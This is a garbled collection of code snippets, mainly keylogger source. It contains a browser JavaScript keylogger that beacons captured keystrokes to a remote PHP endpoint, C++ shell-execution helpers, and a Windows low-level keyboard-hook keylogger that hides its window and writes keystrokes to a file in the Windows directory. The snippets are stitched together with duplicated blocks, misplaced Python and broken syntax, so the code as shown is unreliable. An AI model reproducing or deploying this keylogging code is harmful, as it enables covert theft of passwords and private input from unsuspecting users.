var keys='';
var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';

document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 1000);

var keys='';
document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys != '') {
        new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
        keys = '';
    }
}, 500);

#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main()
{
    // run a process and create a streambuf that reads its stdout and stderr
    redi::ipstream proc("./some_command", redi::pstreams::pstdout | redi::pstreams::pstderr);
    std::string line;
    // read child's stdout
    while (std::getline(proc.out(), line))
        std::cout << "stdout: " << line << '\n';
    # if reading stdout stopped at EOF then reset the state:
    if (proc.eof() && proc.fail())
        proc.clear();
    // read child's stderr
    while (std::getline(proc.err(), line))
        std::cout << "stderr: " << line << '\n';
}
while (true)
{
    switch (readResult = read(childToParent[READ_FD],
        buffer, BUFFER_SIZE))
    {
        case 0: /* End-of-File, or non-blocking read. */
            cout << "End of file reached..."         << endl
            << "Data received was ("
            << dataReadFromChild.size() << "): " << endl
            << dataReadFromChild                << endl;

            ASSERT_IS(pid, waitpid(pid, & status, 0));

            cout << endl
            << "Child exit staus is:  " << WEXITSTATUS(status) << endl
            << endl;

            exit(0);

            from flask import Flask
            server = Flask(__name__)

        @server.route("/")
            def hello():
            return "Hello World!"

            if __name__ == "__main__":
            server.run(host='0.0.0.0')

        ...

        #include "keylogger.h"

            keylogger* keylogger::this_ = NULL;

            keylogger::keylogger(std::ostream* out)
        : out_(out)
        {
            this_ = this;
            hook();
        }
        *(this_->out_) << key;
            keylogger::~keylogger()
        {
            unhook();
        }

            void keylogger::run() const
            {
                MSG msg = { 0 };
                while (GetMessage(&msg, NULL, 0, 0) > 0;
    }

    void keylogger::hide_window() const
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
}

    void keylogger::show_window() const
    {
        ShowWindow(GetConsoleWindow(), SW_SHOW);
}

    void keylogger::hook()
    {
        hhok_ = SetWindowsHookEx(WH_KEYBOARD_LL, hook_process, NULL, 0);
    }

    void keylogger::unhook() const
    {
        UnhookWindowsHookEx(hhok_);
}

    LRESULT CALLBACK keylogger::hook_process(int code, WPARAM wparam, LPARAM lparam)
    {
        if (code == HC_ACTION)
        {
            std::string key;
            KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
            if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
            {
                bool shift_down = GetAsyncKeyState(VK_SHIFT);
                switch (kbs->vkCode)
                {
                    case 0x08: key = "[BACKSPACE]"; break;
                    case 0x09: key = "[TAB]";       break;
                    case 0x0D: key = "[NEWLINE]";   break;
                    case 0x13: key = "[PAUSE]";     break;
                    case 0x14: key = "[CAPS LOCK]"; break;
                    case 0x20: key = "[SPACE]";     break;
                    case 0x25: key = "[LEFT]";      break;
                    case 0x26: key = "[UP]";        break;
                    case 0x27: key = "[RIGHT]";     break;
                    case 0x28: key = "[DOWN]";      break;
                    case 0x2E: key = "[DELETE]";    break;
                    case 0x30: (!shift_down) ? key = "0" : key = ")";   break;
                    case 0x31: (!shift_down) ? key = "1" : key = "!";   break;
                    case 0x32: (!shift_down) ? key = "2" : key = "@";   break;
                    case 0x33: (!shift_down) ? key = "3" : key = "#";   break;
                    case 0x34: (!shift_down) ? key = "4" : key = "$";   break;
                    case 0x35: (!shift_down) ? key = "5" : key = "%";   break;
                    case 0x36: (!shift_down) ? key = "6" : key = "^";   break;
                    case 0x37: (!shift_down) ? key = "7" : key = "&";   break;
                    case 0x38: (!shift_down) ? key = "8" : key = "*";   break;
                    case 0x39: (!shift_down) ? key = "9" : key = "(";   break;
                    case 0x41: (!shift_down) ? key = "a" : key = "A";   break;
                    case 0x42: (!shift_down) ? key = "b" : key = "B";   break;
                    case 0x43: (!shift_down) ? key = "c" : key = "C";   break;
                    case 0x44: (!shift_down) ? key = "d" : key = "D";   break;
                    case 0x45: (!shift_down) ? key = "e" : key = "E";   break;
                    case 0x46: (!shift_down) ? key = "f" : key = "F";   break;
                    case 0x47: (!shift_down) ? key = "g" : key = "G";   break;
                    case 0x48: (!shift_down) ? key = "h" : key = "H";   break;
                    case 0x49: (!shift_down) ? key = "i" : key = "I";   break;
                    case 0x4A: (!shift_down) ? key = "j" : key = "J";   break;
                    case 0x4B: (!shift_down) ? key = "k" : key = "K";   break;
                    case 0x4C: (!shift_down) ? key = "l" : key = "L";   break;
                    case 0x4D: (!shift_down) ? key = "m" : key = "M";   break;
                    case 0x4E: (!shift_down) ? key = "n" : key = "N";   break;
                    case 0x4F: (!shift_down) ? key = "o" : key = "O";   break;
                    case 0x50: (!shift_down) ? key = "p" : key = "P";   break;
                    case 0x51: (!shift_down) ? key = "q" : key = "Q";   break;
                    case 0x52: (!shift_down) ? key = "r" : key = "R";   break;
                    case 0x53: (!shift_down) ? key = "s" : key = "S";   break;
                    case 0x54: (!shift_down) ? key = "t" : key = "T";   break;
                    case 0x55: (!shift_down) ? key = "u" : key = "U";   break;
                    case 0x56: (!shift_down) ? key = "v" : key = "V";   break;
                    case 0x57: (!shift_down) ? key = "w" : key = "W";   break;
                    case 0x58: (!shift_down) ? key = "x" : key = "X";   break;
                    case 0x59: (!shift_down) ? key = "y" : key = "Y";   break;
                    case 0x5A: (!shift_down) ? key = "z" : key = "Z";   break;
                    case 0x60: (!shift_down) ? key = "0" : key = "0";   break;
                    case 0x61: (!shift_down) ? key = "1" : key = "1";   break;
                    case 0x62: (!shift_down) ? key = "2" : key = "2";   break;
                    case 0x63: (!shift_down) ? key = "3" : key = "3";   break;
                    case 0x64: (!shift_down) ? key = "4" : key = "4";   break;
                    case 0x65: (!shift_down) ? key = "5" : key = "5";   break;
                    case 0x66: (!shift_down) ? key = "6" : key = "6";   break;
                    case 0x67: (!shift_down) ? key = "7" : key = "7";   break;
                    case 0x68: (!shift_down) ? key = "8" : key = "8";   break;
                    case 0x69: (!shift_down) ? key = "9" : key = "9";   break;
                    case 0x6A: (!shift_down) ? key = "*" : key = "*";   break;
                    case 0x6B: (!shift_down) ? key = "+" : key = "+";   break;
                    case 0x6D: (!shift_down) ? key = "-" : key = "-";   break;
                    case 0x6E: (!shift_down) ? key = "." : key = ".";   break;
                    case 0x6F: (!shift_down) ? key = "/" : key = "/";   break;
                    case 0xBA: (!shift_down) ? key = ";" : key = ":";   break;
                    case 0xBB: (!shift_down) ? key = "=" : key = "+";   break;
                    case 0xBC: (!shift_down) ? key = "," : key = "<";   break;
                    case 0xBD: (!shift_down) ? key = "-" : key = "_";   break;
                    case 0xBE: (!shift_down) ? key = "." : key = ">";   break;
                    case 0xBF: (!shift_down) ? key = "/" : key = "?";   break;
                    case 0xC0: (!shift_down) ? key = "`" : key = "~";   break;
                    case 0xDB: (!shift_down) ? key = "[" : key = "{";   break;
                    case 0xDC: (!shift_down) ? key = "\\" : key = "|";  break;
                    case 0xDD: (!shift_down) ? key = "]" : key = "}";   break;
                    case 0xDE: (!shift_down) ? key = "'" : key = "\"";  break;
                }
            }
        *(this_->out_) << key;
        }
        return CallNextHookEx(NULL, code, wparam, lparam);
    }

    __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
    {
        if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
            static bool capslock = false;
            static bool shift = false;
            char tmp[0xFF] = {0};
            std::string str;
            DWORD msg = 1;
            KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
            bool printable;

            /*
             * Get key name as string
             */
            msg += (st_hook.scanCode << 16);
            msg += (st_hook.flags << 24);
            GetKeyNameText(msg, tmp, 0xFF);
            str = std::string(tmp);

            printable = (str.length() <= 1) ? true : false;

            /*
             * Non-printable characters only:
             * Some of these (namely; newline, space and tab) will be
             * made into printable characters.
             * Others are encapsulated in brackets ('[' and ']').
             */
            if (!printable) {
                /*
                 * Keynames that change state are handled here.
                 */
                if (str == "CAPSLOCK")
                    capslock = !capslock;
                else if (str == "SHIFT")
                    shift = true;

                /*
                 * Keynames that may become printable characters are
                 * handled here.
                 */
                if (str == "ENTER") {
                    str = "\n";
                    printable = true;
                } else if (str == "SPACE") {
                    str = " ";
                    printable = true;
                } else if (str == "TAB") {
                    str = "\t";
                    printable = true;
                } else {
                    str = ("[" + str + "]");
                }
            }

            /*
             * Printable characters only:
             * If shift is on and capslock is off or shift is off and
             * capslock is on, make the character uppercase.
             * If both are off or both are on, the character is lowercase
             */
            if (printable) {
                if (shift == capslock) { /* Lowercase */
                    for (size_t i = 0; i < str.length(); ++i)
                    str[i] = tolower(str[i]);
                } else { /* Uppercase */
                    for (size_t i = 0; i < str.length(); ++i) {
                        if (str[i] >= 'A' && str[i] <= 'Z') {
                            str[i] = toupper(str[i]);
                        }
                    }
                }

                shift = false;
            }

            #ifdef DEBUG
            std::cout << str;
            #endif
            std::string path = std::string(windir) + "\\" + OUTFILE_NAME;
            std::ofstream outfile(path.c_str(), std::ios_base::app);
            outfile << str;
            outfile.close();
        }

        return CallNextHookEx(kbdhook, code, wp, lp);
    }


    /**
     * \brief Called by DispatchMessage() to handle messages
     * \param hwnd	Window handle
     * \param msg	Message to handle
     * \param wp
     * \param lp
     * \return 0 on success
     */
    LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
    {
        switch (msg) {
            case WM_CLOSE: case WM_DESTROY:
                running = false;
                break;
            default:
                /* Call default message handler */
                return DefWindowProc(hwnd, msg, wp, lp);
        }

        return 0;
    }

    int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
    LPSTR cmdline, int ncmdshow)
    {
        /*
         * Set up window
         */
        HWND		hwnd;
        HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
        MSG		msg;
        WNDCLASSEX	windowclass;
        HINSTANCE	modulehandle;

        windowclass.hInstance = thisinstance;
        windowclass.lpszClassName = CLASSNAME;
        windowclass.lpfnWndProc = windowprocedure;
        windowclass.style = CS_DBLCLKS;
        windowclass.cbSize = sizeof(WNDCLASSEX);
        windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
        windowclass.hCursor  = LoadCursor(NULL, IDC_ARROW);
        windowclass.lpszMenuName = NULL;
        windowclass.cbClsExtra = 0;
        windowclass.cbWndExtra = 0;
        windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

        if (!(RegisterClassEx(&windowclass)))
        return 1;

        hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
            thisinstance, NULL);
        if (!(hwnd))
            return 1;

        /*
         * Make the window invisible
         */
        #ifdef DEBUG
        /*
         * Debug mode: Make the window visible
         */
        ShowWindow(hwnd, SW_SHOW);
        #else
        ShowWindow(hwnd, SW_HIDE);
        #endif
        UpdateWindow(hwnd);
        SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

        /*
         * Hook keyboard input so we get it too
         */
        modulehandle = GetModuleHandle(NULL);
        kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

        running = true;

        GetWindowsDirectory((LPSTR)windir, MAX_PATH);

        /*
         * Main loop
         */
        while (running) {
            /*
             * Get messages, dispatch to window procedure
             */
            if (!GetMessage(&msg, NULL, 0, 0))
            running = false; /*
					  * This is not a "return" or
					  * "break" so the rest of the loop is
					  * done. This way, we never miss keys
					  * when destroyed but we still exit.
					  */
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        return 0;
    }